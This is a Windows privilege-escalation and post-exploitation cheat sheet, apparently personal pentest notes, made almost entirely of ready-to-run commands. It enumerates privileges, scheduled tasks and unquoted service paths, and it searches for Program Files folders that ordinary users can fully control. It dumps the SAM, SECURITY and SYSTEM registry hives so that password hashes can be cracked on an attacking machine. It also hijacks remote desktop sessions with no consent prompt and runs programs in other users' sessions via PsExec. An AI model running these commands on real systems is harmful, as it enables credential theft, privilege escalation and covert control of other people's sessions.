#### tasklist run by current user

```tasklist -v```

-----


#### accesschk

*https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account?redirectedfrom=MSDN*

```accesschk.exe /accepteula -qwcu "Authenticated Users" *```

-----


#### firewall

```netsh firewall show state```

```netsh firewall show config```

-----


#### privs

```whoami /priv```

-----


#### scheduled tasks

```schtasks /query /fo list /v```

-----


#### file privs

```dir file.txt /s /p```

```icacls "c:\program files\whatever"```

-----


#### wmic

```wmic useraccount get name,sid```

```cmd /c 'wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:windows\" |findstr /i /v """'```

-----


#### SAM dump

*SAM file: C:\Windows\system32\config*

*backup SAM reg key*

```reg save hklm\sam sam.save```

*backup security reg key*

```reg save hklm\security security.save```

*backup system reg key*

```reg save hklm\system system.save```

*On attacking machine:*

```samdump2 system.save sam.save```

```pwdump system.save sam.save```

-----


#### show files and folders in "Program Files" with (F)ull permissions set for "Everyone"

```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
```

-----


#### show files and folders in "Program Files" with (F)ull permissions set for "BUILTIN\Users"

```
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
```

-----


#### reboot remote machine

```
shutdown /m \\DEV /r /t 1
```

-----


#### query remote desktop sessions

```
qwinsta /server:remote.host
```

```
query session /server:remote.host
```

-----


#### kill session ID 2

```
rwinsta /server:remote.host 2
```

-----


#### remote desktop, control session, no consent prompt

```
mstsc /v:DEV /shadow:2 /noConsentPrompt /control
```

-----


#### run notepad in logged in session ID 2

```
PsExec.exe -i 2 \\REMOTEMACHINE notepad
```

-----


#### run chrome browser, navigate to youtube in logged in session ID 2

```
psexec \\dev -i 2 "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" "https://www.youtube.com"
```

-----


